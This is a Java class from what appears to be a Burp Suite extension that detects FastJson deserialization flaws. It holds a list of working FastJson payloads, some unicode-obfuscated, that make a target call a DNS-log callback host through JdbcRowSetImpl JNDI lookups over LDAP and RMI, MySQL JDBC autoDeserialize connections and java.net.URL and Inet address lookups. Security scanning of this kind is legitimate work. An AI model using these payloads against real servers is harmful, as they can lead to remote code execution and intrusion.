package burp.Application.FastJsonDnsLogDetection;

import burp.Application.FastJsonDnsLogDetection.ExtensionMethod.*;

import burp.Bootstrap.BurpAnalyzedRequest;
import burp.IBurpExtenderCallbacks;

import java.util.Date;

public class FastJsonDnsLog {
    private FastJsonDnsLogTypeInterface fastJsonDnsLogType;

    // 该模块启动日期
    private Date startDate = new Date();

    // 程序最大执行时间,单位为秒
    // 会根据payload的添加而添加
    private int maxExecutionTime = 120;

    public FastJsonDnsLog(
            IBurpExtenderCallbacks callbacks,
            BurpAnalyzedRequest baseAnalyzedRequest,
            String callClassName) {
        this.init(callbacks, baseAnalyzedRequest, callClassName);
    }

    private FastJsonDnsLogTypeInterface init(IBurpExtenderCallbacks callbacks,
                                             BurpAnalyzedRequest baseAnalyzedRequest,
                                             String callClassName) {
        String[] dnsLogPayloads = {
                "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/miao1\",\"autoCommit\":true}}",
                "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/miao2\",\"autoCommit\":true}}",
                "{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/miao3\",\"autoCommit\":true}}",
                "{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/miao4\",\"autoCommit\":true}}",
                "{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"dnslog-url\",\"portToConnectTo\":80,\"info\":{\"user\":\"root\",\"password\":\"ubuntu\",\"useSSL\":\"false\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"},\"databaseToConnectTo\":\"mysql\",\"url\":\"\"}}",
                "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\":\"jdbc:mysql://dnslog-url:80/foo?allowLoadLocalInfile=true\"}}}",
                "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\"proxy\":{\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\"connectionUrl\":{\n" +
                        "\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\":\n" +
                        "[{\"host\":\"dnslog-url\"}], \"slaves\":[],\n" +
                        "\"properties\":{\"host\":\"mysql.host\",\"user\":\"root\",\"dbname\":\"dbname\",\"password\":\"pass\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"}}}}",
                "{\"a\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao5\"}}\"\"},\"b\":{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao6\"}:\"x\"},\"c\":{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao7\"}:0,\"d\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao8\"}],\"e\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao9\"},}",
                "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog-url\"}}",
                "{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog-url\"}",
                "{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog-url\"}"
                };

        // 获得最终的程序最大执行时间
        int keyLength = dnsLogPayloads.length;
        if (keyLength > 20) {
            this.maxExecutionTime += (keyLength - 20) * 6;
        }

        // 使用dnslog判断是否是FastJson的方法
        if (callClassName.equals("FastJsonDnsLogType1")) {
            FastJsonDnsLogType1 fastJsonDnsLogType = new FastJsonDnsLogType1(
                    callbacks,
                    baseAnalyzedRequest,
                    dnsLogPayloads,
                    this.startDate,
                    this.maxExecutionTime);
            this.fastJsonDnsLogType = fastJsonDnsLogType;
            return this.fastJsonDnsLogType;
        }

        throw new IllegalArgumentException(
                String.format("FastJsonDnsLog识别模块-对不起您输入的 %s 扩展找不到", callClassName));
    }

    public FastJsonDnsLogTypeInterface run() {
        return this.fastJsonDnsLogType;
    }
}
